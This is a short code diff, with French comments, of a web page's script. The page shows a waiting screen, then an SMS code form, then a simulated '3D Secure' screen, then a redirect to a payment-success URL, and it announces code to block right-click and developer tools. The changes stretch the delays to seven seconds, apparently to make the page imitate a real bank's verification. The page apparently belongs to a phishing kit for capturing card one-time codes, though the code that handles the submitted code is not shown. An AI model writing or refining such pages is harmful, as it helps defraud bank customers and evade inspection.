@@ -106,11 +106,11 @@
     </div>
 
     <script>
-        // Afficher le formulaire SMS après 1 seconde
+        // Afficher le formulaire SMS après 7 secondes
         setTimeout(function() {
             document.getElementById('waiting').style.display = 'none';
             document.getElementById('smsForm').style.display = 'block';
-        }, 1000); // 1 seconde
+        }, 7000); // 7 secondes d'attente avant d'afficher le formulaire SMS
 
         // Gérer la soumission du formulaire SMS
         document.getElementById('smsCodeForm').addEventListener('submit', async function(event) {
@@ -141,8 +141,8 @@
                 // Redirection après 7 secondes
                 setTimeout(function() {
                     window.location.href = 'https://example.com/success'; // Remplacez par l'URL de la page de paiement réussi
-                }, 7000); // 7 secondes
-            }, 7000); // 7 secondes d'attente avant la redirection
+                }, 7000); // 7 secondes d'attente avant la redirection
+            }, 7000); // 7 secondes d'attente avant l'affichage de l'écran 3D Secure
         });
 
         // Désactiver le clic droit et les outils de développement
